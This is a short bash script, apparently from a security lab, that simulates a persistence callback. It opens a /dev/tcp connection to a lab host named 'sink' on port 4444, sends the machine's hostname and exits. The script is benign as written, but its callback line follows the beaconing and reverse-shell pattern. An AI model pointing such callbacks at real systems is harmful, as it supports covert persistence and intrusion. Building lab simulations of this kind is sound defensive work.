#!/bin/bash
# Lab stand-in for a persistence callback: connects to sink:4444 once, says who
# it is, and exits. The sink is the lab's own container on an internal network;
# the address is fixed here so this can reach nothing else.
exec 3<>/dev/tcp/sink/4444 || exit 0
echo "lab-callback $(hostname)" >&3
exec 3>&-
